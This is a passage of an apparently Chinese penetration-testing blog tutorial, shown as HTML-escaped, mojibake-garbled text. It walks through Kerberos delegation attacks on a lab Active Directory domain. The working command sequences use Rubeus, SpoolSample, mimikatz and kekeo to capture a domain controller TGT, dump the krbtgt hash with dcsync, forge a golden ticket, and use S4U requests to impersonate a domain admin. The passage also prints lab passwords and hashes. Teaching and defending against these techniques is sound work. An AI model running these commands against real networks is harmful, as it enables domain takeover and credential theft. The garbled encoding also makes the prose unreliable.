&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ldapsearch -x -H ldap://172.16.0.106:389 -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;CN=lucky,CN=Users,DC=hack,DC=lab&amp;#34;&lt;/span&gt; -w p@ssw0rd -b &lt;span class=&#34;s2&#34;&gt;&amp;#34;DC=hack,DC=lab&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -iE &lt;span class=&#34;s2&#34;&gt;&amp;#34;distinguishedName&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ldapsearch -x -H ldap://172.16.0.106:389 -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;CN=lucky,CN=Users,DC=hack,DC=lab&amp;#34;&lt;/span&gt; -w p@ssw0rd -b &lt;span class=&#34;s2&#34;&gt;&amp;#34;DC=hack,DC=lab&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -iE &lt;span class=&#34;s2&#34;&gt;&amp;#34;distinguishedName&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;éçº¦æŸå§”æ´¾spooleræ‰“å°æœº&#34;&gt;éçº¦æŸå§”æ´¾+spooleræ‰“å°æœº&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œé«˜æƒé™ç”¨æˆ·æ˜¯ä¸ä¼šä¸»åŠ¨å»è®¿é—®ä½ çš„ï¼Œé™¤éæ˜¯ä½ æ‹¿åˆ°äº†webæœåŠ¡å™¨è¿™ç§ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°harmj0yå¤§ä½¬å‘çš„ä¸€ç¯‡æ–‡ç« &lt;a href=&#34;https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory&#34;&gt;The Unintended Risks of Trusting Active Directory&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥åˆ©ç”¨åŸŸæ§æˆ–è€…å…¶ä»–æœåŠ¡å™¨ä¸Šé¢çš„spooleræœåŠ¡å»ä¸»åŠ¨è®¿é—®æˆ‘ä»¬çš„ä¸»æœºï¼Œè¿™é‡Œé¢ä¼šç”¨åˆ°ä¸¤ä¸ªå·¥å…·ï¼Œä¸€ä¸ªæ˜¯&lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt;å’Œ&lt;a href=&#34;https://github.com/leechristensen/SpoolSample&#34;&gt;SpoolSample&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¤ä¸ªå·¥å…·éƒ½éœ€è¦è‡ªå·±å»ç¼–è¯‘åä½¿ç”¨ï¼Œå…¶å®å¾ˆç®€å•çš„ï¼Œä½ ä¸‹ä¸ªvsç„¶åæ‰“å¼€è§£å†³æ–¹æ¡ˆæ–‡ä»¶é‡æ–°ç”Ÿæˆå°±è¡Œäº†ã€‚åœ¨ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« ä¸­æœ‰å†™åˆ°è¿™æ¬¾å·¥å…·çš„ç¼–è¯‘&lt;a href=&#34;https://xxe.icu/posts/ad_as_reproasting/#rubeus&#34;&gt;åŸŸæ¸—é€-AS_REPRoasting&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;ç¯å¢ƒéƒ¨ç½²&#34;&gt;ç¯å¢ƒéƒ¨ç½²&lt;/h3&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;åŸŸæ§æœåŠ¡å™¨ï¼š172.16.0.106     åŸŸç®¡ç†ç”¨æˆ·ï¼šdc_admin  åŸŸæ§ä¸»æœºåï¼šdc&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœºï¼š172.16.0.111     æœ¬åœ°ç®¡ç†å‘˜ï¼šxd32 åŸŸæ™®é€šç”¨æˆ·ï¼štessql  åŸŸæ§ä¸»æœºåï¼šsql&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆåœ¨åŸŸæ§æŠŠä¸»æœºSQLå¼€å¯éçº¦æŸå§”æ´¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;å®æˆ˜-1&#34;&gt;å®æˆ˜&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯åœ¨SQLä¸»æœºä¸Šè¿›è¡Œæ“ä½œäº†ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rubeusåœ¨æœ¬åœ°ç®¡ç†å‘˜è¿è¡Œ&lt;/strong&gt;ï¼Œå› ä¸ºè¦è¯»å–ç³»ç»Ÿè®°å½•æ—¥å¿—ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SpoolSampleåœ¨åŸŸç”¨æˆ·ä¸‹è¿è¡Œ&lt;/strong&gt;ï¼Œè¦ä¸ç„¶ä½ æ— æ³•ä½¿ç”¨MS-RPRNåè®®è¿›è¡Œé€šä¿¡ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨æœ¬åœ°ç®¡ç†å‘˜xd32ä¸‹ä½¿ç”¨ç®¡ç†å‘˜æ¨¡å¼æ‰“å¼€cmdï¼Œè¾“å…¥æˆ‘ä»¬è¦ç›‘æ§çš„åŸŸæ§åç§°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe monitor /interval:1 /filteruser:dc$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å†åœ¨SQLä¸»æœºç™»å½•å¦å¤–ä¸€ä¸ªç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯åŸŸç”¨æˆ·testsqlï¼Œå¯åŠ¨SpoolSampleï¼Œè¾“å…¥åŸŸæ§åå’Œéçº¦æŸå§”æ´¾çš„ä¸»æœºåï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SpoolSample.exe dc sql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†æ¢å›æœ¬åœ°ç®¡ç†å‘˜ï¼Œå·²ç»æ•è·åˆ°äº†åŸŸæ§çš„TGTäº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªTGTæ˜¯base64ä½çš„ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•å»å¯¼å…¥å†…å­˜ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ä¸€ä¸‹åœ¨cmdä¸­å¤åˆ¶å‡ºæ¥çš„å­—ç¬¦ï¼Œå¯ä»¥å‚è€ƒæ–‡ç« ä½¿ç”¨notepad++æ“ä½œï¼š&lt;a href=&#34;https://blog.csdn.net/zhengxinjian_2009/article/details/70763544&#34;&gt;Notepad++ä¸­æŸ¥æ‰¾æ›¿æ¢å›è½¦ç¬¦&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ–¹æ³•ä¸€ï¼š&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨powershellçš„base64è½¬æ¢åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;IO.File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteAllBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dc.kirbi&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Convert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FromBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;æ•è·åˆ°çš„base64ç¼–ç &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;p&gt;å®ƒä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ&lt;code&gt;dc.kirbi&lt;/code&gt;æ–‡ä»¶ï¼Œç°åœ¨æˆ‘ä»¬ç›´æ¥ç”¨mimikatzå¯¼å…¥ç¥¨æ®å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::ptt dc.kirbi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/17.png&#34; alt=&#34;17&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ–¹æ³•äºŒï¼š&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨Rubeuså·¥å…·ç›´æ¥æŠŠbase64å­—ç¬¦ä¸²å¯¼å…¥ç¥¨æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe ptt /ticket:base64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/19.png&#34; alt=&#34;19&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†ç”¨mimikatzå¯¼å‡ºç¥¨æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::tickets /export
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/20.png&#34; alt=&#34;20&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨mimikatzæŠŠç¥¨æ®å†™å…¥å†…å­˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::ptt [0;965be]-2-0-60a10000-DC$@krbtgt-HACK.LAB.kirbi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/21.png&#34; alt=&#34;21&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å·²ç»æœ‰äº†åŸŸæ§çš„TGTï¼Œå°±å¯ä»¥ä½¿ç”¨mimikatzçš„dcsyncåŠŸèƒ½å¯¼å‡ºkrbtgtçš„hashæ¥åˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsadump::dcsync /domain:hack.lab /user:hack\krbtgt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/22.png&#34; alt=&#34;22&#34;&gt;&lt;/p&gt;
&lt;p&gt;é»„é‡‘ç¥¨æ®å¯ä»¥åœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« è¿›è¡Œäº†è§£ï¼š&lt;a href=&#34;https://xxe.icu/posts/ad_ptt/#0x03-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEgolden-ticket&#34;&gt;åŸŸæ¸—é€-ç¥¨æ®ä¼ é€’æ”»å‡»&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹krbtgtçš„sidå’Œntlm hashï¼š&lt;/p&gt;
&lt;p&gt;sidï¼šS-1-5-21-3896163557-1645138957-2306563325&lt;/p&gt;
&lt;p&gt;ntlm hashï¼š79f9b4b4e9ffced451fb812cac908bb6&lt;/p&gt;
&lt;p&gt;ä¸‹é¢å°±å¼€å§‹ç”¨mimikatzæ¥åˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /krbtgt:79f9b4b4e9ffced451fb812cac908bb6 /user:fakeuser /ptt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ¶ä½œå®Œæˆå°±å¯ä»¥è®¿é—®dcæœåŠ¡å™¨äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/23.png&#34; alt=&#34;23&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x02-çº¦æŸå§”æ´¾&#34;&gt;0x02 çº¦æŸå§”æ´¾&lt;/h1&gt;
&lt;p&gt;æœ‰éçº¦æŸå§”æ´¾é‚£è‚¯å®šå°±æœ‰çº¦æŸå§”æ´¾å•¦ï¼Œå¾®è½¯å¾ˆæ—©å°±æ„è¯†åˆ°éçº¦æŸå§”æ´¾å¹¶ä¸æ˜¯ç‰¹åˆ«å®‰å…¨ï¼Œåœ¨ Windows 2003ä¸Šå‘å¸ƒäº†&amp;quot;çº¦æŸ&amp;quot;å§”æ´¾ã€‚ å…¶ä¸­åŒ…æ‹¬ä¸€ç»„ Kerberos åè®®æ‰©å±•ï¼Œå°±æ˜¯æœ¬æ–‡åˆ°çš„ä¸¤ä¸ªæ‰©å±• S4U2Self å’Œ S4U2Proxyã€‚&lt;/p&gt;
&lt;p&gt;é…ç½®å®ƒåï¼Œçº¦æŸå§”æ´¾å°†é™åˆ¶æŒ‡å®šæœåŠ¡å™¨å¯ä»¥ä»£è¡¨ç”¨æˆ·æ‰§è¡Œçš„æœåŠ¡ã€‚è¿™éœ€è¦åŸŸç®¡ç†å‘˜ç‰¹æƒ(å…¶å®ä¸¥è°¨ä¸€ç‚¹æ˜¯SeEnableDelegationç‰¹æƒï¼Œè¯¥ç‰¹æƒå¾ˆæ•æ„Ÿï¼Œé€šå¸¸ä»…æˆäºˆåŸŸç®¡ç†å‘˜)æ‰èƒ½ä¸ºæœåŠ¡é…ç½®åŸŸå¸æˆ·ï¼Œå¹¶ä¸”å°†å¸æˆ·é™åˆ¶ä¸ºå•ä¸ªåŸŸã€‚&lt;/p&gt;
&lt;p&gt;å¥½äº†ï¼Œæˆ‘ä»¬å…ˆå¼€å§‹å®æˆ˜å†è®¨è®ºå…¶ä¸­çš„åŸç†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ç¯å¢ƒ-1&#34;&gt;ç¯å¢ƒ&lt;/h2&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;åŸŸæ§æœåŠ¡å™¨ï¼ˆserver 2019ï¼‰ï¼š172.16.0.106     åŸŸç®¡ç†ç”¨æˆ·ï¼šdc_admin  åŸŸæ§ä¸»æœºåï¼šdc&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœº ï¼ˆWindows 10ï¼‰ï¼š172.16.0.111     æœ¬åœ°ç®¡ç†å‘˜ï¼šxd32 åŸŸæ™®é€šç”¨æˆ·ï¼štestsql  åŸŸæ§ä¸»æœºåï¼šsql&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœº ï¼ˆWindows 7ï¼‰ï¼š172.16.0.105     æœ¬åœ°ç®¡ç†å‘˜ï¼šsc92n  åŸŸæ™®é€šç”¨æˆ·ï¼štestsql  åŸŸæ§ä¸»æœºåï¼šwin7a&lt;/p&gt;
&lt;p&gt;è¿™é‡Œåˆ†ä¸ºä½¿ç”¨ä¸»æœºè´¦æˆ·å’ŒæœåŠ¡è´¦æˆ·çš„æ”»å‡»æ–¹å¼ï¼Œä¸è¿‡éƒ½æ˜¯å¤§åŒå°å¼‚ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜-ä¸»æœºè´¦æˆ·&#34;&gt;å®æˆ˜-ä¸»æœºè´¦æˆ·&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆåœ¨åŸŸæ§æŠŠä¸»æœºwin7aå¼€å¯çº¦æŸå§”æ´¾,å…è®¸å§”æ´¾è®¿é—®åˆ°SQLä¸»æœºçš„cifsæœåŠ¡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/24.png&#34; alt=&#34;24&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬å›åˆ°ä¸‹é¢è¿™å°ä¸»æœºè¿›è¡Œæ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åŸŸå†…ä¸»æœº ï¼ˆWindows 7ï¼‰ï¼š172.16.0.105    æœ¬åœ°ç®¡ç†å‘˜ï¼šsc92n  åŸŸæ§ä¸»æœºåï¼šwin7a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å› ä¸ºæˆ‘ä»¬å·²ç»ç­‰äº†åœ¨è¿™å°å¼€å¯äº†çº¦æŸå§”æ´¾çš„ä¸»æœºä¸Šäº†ï¼Œè€Œä¸”æ‹¥æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯mimikatzå·¥å…·ï¼Œç›´æ¥å¯¼å‡ºTGTå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::tickets /export
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/25.png&#34; alt=&#34;25&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‡å¦‚ä½ æ²¡æœ‰å¯¼å‡ºçš„æƒé™æˆ–è€…æ²¡æœ‰ç™»å½•è¿™å°ä¸»æœºï¼Œä½†æ˜¯æ‹¥æœ‰ä¸»æœºè´¦æˆ·çš„ntlm hashå¯ä»¥ä½¿ç”¨kekeoå·¥å…·ç”³è¯·ä¸€å¼ TGTï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tgt::ask /user:win7a$ /domain:hack.lab /ntlm:ä¸»æœºè´¦æˆ·çš„hash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœæ˜¯ä½¿ç”¨å¯†ç å°±æŠŠntlmæ”¹æˆpasswordå³å¯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/26.png&#34; alt=&#34;26&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬ä½¿ç”¨è¿™å¼ TGTä¼ªé€ ä¸€å¼ åŸŸç®¡ç†å‘˜çš„ç¥¨æ®ï¼Œå»ç”³è¯·è®¿é—®SQLä¸»æœºçš„cifsæœåŠ¡ï¼Œæˆ‘ä»¬åœ¨kekeoæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tgs::s4u /tgt:TGT_win7a$@HACK.LAB_krbtgt~hack.lab@HACK.LAB.kirbi /user:dc_admin /service:cifs/sql.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/27.png&#34; alt=&#34;27&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬å°±æ‹¿ç€è¿™å¼ ä¼ªé€ çš„ç¥¨æ®ä½¿ç”¨kekeoæˆ–è€…mimikatzå¯¼å…¥å†…å­˜ï¼Œç„¶åè®¿é—®SQLä¸»æœºä¸Šé¢çš„æ–‡ä»¶ï¼Œè¿˜å¯ä»¥è®¿é—®åŸŸç®¡ç†å‘˜åœ¨SQLä¸»æœºç™»å½•åç•™ä¸‹çš„æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::ptt TGS_dc_admin@HACK.LAB@HACK.LAB_cifs~sql.HACK.LAB@HACK.LAB.kirbi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/28.png&#34; alt=&#34;28&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜-æœåŠ¡è´¦å·ç”Ÿæˆé»„é‡‘ç¥¨æ®&#34;&gt;å®æˆ˜-æœåŠ¡è´¦å·ï¼ˆç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼‰&lt;/h2&gt;
&lt;p&gt;æ—¢ç„¶ä¸Šé¢ä»‹ç»äº†ä¸»æœºè´¦æˆ·çº¦æŸå§”æ´¾çš„æ”»å‡»ï¼Œå®ç°äº†ä¼ªé€ åŸŸæ§ç®¡ç†å‘˜è¿œç¨‹è®¿é—®SQLä¸»æœºçš„cifsæœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;æœåŠ¡è´¦å·ä¹Ÿæ˜¯ä¸€æ ·çš„æ“ä½œï¼Œåªä¸è¿‡æ˜¯æŠŠå‚æ•°é‡Œé¢çš„useræ›´æ¢æˆæœåŠ¡è´¦å·å°±è¡Œäº†ï¼Œä¸‹é¢æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§æ”»å‡»æ–¹å¼å®ç°ç”Ÿæˆé»„é‡‘ç¥¨æ®ã€‚&lt;/p&gt;
